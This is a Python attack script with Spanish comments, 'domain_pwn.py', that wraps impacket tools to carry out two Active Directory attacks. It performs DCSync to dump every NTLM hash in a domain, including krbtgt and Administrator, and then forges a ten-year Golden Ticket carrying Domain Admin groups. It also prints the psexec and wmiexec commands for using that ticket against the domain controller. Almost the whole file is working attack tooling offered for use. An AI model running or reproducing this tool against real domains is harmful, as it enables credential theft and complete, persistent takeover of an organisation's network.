#!/usr/bin/env python3
"""
domain_pwn.py — DCSync y Golden Ticket
MITRE ATT&CK: T1003.006 (DCSync) · T1558.001 (Golden Ticket)

Uso:
    # DCSync — volcar todos los hashes del dominio
    python3 domain_pwn.py dcsync --dc 192.168.1.10 --domain empresa.local \
        -u Administrador -p "Admin123!"

    # Golden Ticket — crear ticket con hash de krbtgt
    python3 domain_pwn.py golden --domain empresa.local \
        --krbtgt-hash HASH --sid S-1-5-21-XXX --user "FalseAdmin"
"""

import argparse
import subprocess
import sys
import re


class C:
    RED="\033[91m";GREEN="\033[92m";YELLOW="\033[93m"
    BLUE="\033[94m";CYAN="\033[96m";BOLD="\033[1m";RESET="\033[0m"

def ok(m):   print(C.GREEN+  "  [+] "+C.RESET+m)
def info(m): print(C.BLUE+   "  [*] "+C.RESET+m)
def warn(m): print(C.YELLOW+ "  [!] "+C.RESET+m)
def crit(m): print(C.RED+C.BOLD+"  [!] "+C.RESET+m)


def banner():
    print(C.RED+C.BOLD+"""
  ╔══════════════════════════════════════════════════╗
  ║   DOMAIN PWN — DCSync · Golden Ticket            ║
  ║   Requiere privilegios de Domain Admin           ║
  ╚══════════════════════════════════════════════════╝
"""+C.RESET)


def cmd_dcsync(args):
    """Ejecuta DCSync y extrae todos los hashes del dominio."""
    info("Iniciando DCSync contra " + args.domain)
    info("DC: " + args.dc + " | Usuario: " + args.user)
    warn("Requiere: Domain Admin o DCSync rights (DS-Replication-Get-Changes-All)")
    print()

    outfile = args.output or "/tmp/dcsync_" + args.domain.split(".")[0]

    if args.password:
        creds = args.domain + "/" + args.user + ":'" + args.password + "'"
    else:
        creds = args.domain + "/" + args.user

    cmd = ["impacket-secretsdump", creds + "@" + args.dc,
           "-just-dc-ntlm", "-outputfile", outfile]

    if args.hash:
        cmd = ["impacket-secretsdump",
               args.domain + "/" + args.user + "@" + args.dc,
               "-hashes", ":" + args.hash,
               "-just-dc-ntlm", "-outputfile", outfile]

    info("Ejecutando: " + " ".join(cmd[:3]) + " ...")
    print()

    try:
        result = subprocess.run(cmd, text=True, capture_output=True, timeout=120)
        output = result.stdout + result.stderr

        if "krbtgt" in output or "Administrador" in output:
            ok("DCSync EXITOSO")
            print()

            # Extraer hashes importantes
            lines = output.split("\n")
            critical = ["krbtgt", "Administrador", "Administrator"]
            print(C.BOLD + "  Hashes de alto valor:" + C.RESET)
            for line in lines:
                for c in critical:
                    if c + ":" in line.lower():
                        parts = line.split(":")
                        if len(parts) >= 4:
                            crit(line.strip())

            print()
            ok("Todos los hashes guardados en: " + outfile + ".ntds")
            print()
            info("Siguiente paso — Golden Ticket:")
            print("  python3 domain_pwn.py golden --domain " + args.domain +
                  " --krbtgt-hash <HASH_KRBTGT> --sid <SID>")
        else:
            warn("DCSync fallo. Verificar credenciales y privilegios.")
            print(output[:500])

    except FileNotFoundError:
        crit("impacket-secretsdump no encontrado")
        info("Instalar: pip install impacket")
    except subprocess.TimeoutExpired:
        warn("Timeout — problema de conectividad con el DC")


def cmd_golden(args):
    """Crea un Golden Ticket con el hash de krbtgt."""
    info("Creando Golden Ticket para: " + args.user)
    info("Dominio: " + args.domain)
    info("krbtgt hash: " + args.krbtgt_hash[:8] + "...")
    print()

    outfile = args.output or "golden_ticket"

    cmd = [
        "impacket-ticketer",
        "-nthash", args.krbtgt_hash,
        "-domain-sid", args.sid,
        "-domain", args.domain,
        "-user", args.user,
        "-groups", "512,513,518,519,520",
        outfile,
    ]

    info("Ejecutando ticketer...")

    try:
        result = subprocess.run(cmd, text=True, capture_output=True, timeout=30)
        output = result.stdout + result.stderr
        print(output)

        if "Saving" in output or outfile + ".ccache" in output or result.returncode == 0:
            ok("Golden Ticket creado: " + outfile + ".ccache")
            print()
            print(C.BOLD + "  Para usar el ticket:" + C.RESET)
            print("  export KRB5CCNAME=" + outfile + ".ccache")
            print("  impacket-psexec -k -no-pass " + args.domain + "/" +
                  args.user + "@DC01." + args.domain)
            print("  impacket-wmiexec -k -no-pass " + args.domain + "/" +
                  args.user + "@DC01." + args.domain)
            print()
            warn("El Golden Ticket es valido por 10 ANOS")
            warn("Sobrevive al cambio de contrasena del Administrador")
            warn("Para neutralizarlo: cambiar krbtgt DOS VECES con 10h de diferencia")
        else:
            warn("Error creando el ticket")
            print(output[:300])

    except FileNotFoundError:
        crit("impacket-ticketer no encontrado")


def parse_args():
    p = argparse.ArgumentParser(description="domain_pwn.py — DCSync y Golden Ticket")
    sub = p.add_subparsers(dest="command", required=True)

    dc = sub.add_parser("dcsync", help="Volcar hashes via DCSync")
    dc.add_argument("--dc",     required=True)
    dc.add_argument("--domain", required=True)
    dc.add_argument("-u", "--user",     required=True)
    dc.add_argument("-p", "--password", default=None)
    dc.add_argument("-H", "--hash",     default=None)
    dc.add_argument("--output", default=None)

    gt = sub.add_parser("golden", help="Crear Golden Ticket")
    gt.add_argument("--domain",       required=True)
    gt.add_argument("--krbtgt-hash",  required=True)
    gt.add_argument("--sid",          required=True, help="SID del dominio")
    gt.add_argument("--user",         default="FalseAdmin")
    gt.add_argument("--output",       default="golden_ticket")

    return p.parse_args()


def main():
    banner()
    args = parse_args()
    if args.command == "dcsync": cmd_dcsync(args)
    elif args.command == "golden": cmd_golden(args)

if __name__ == "__main__":
    main()
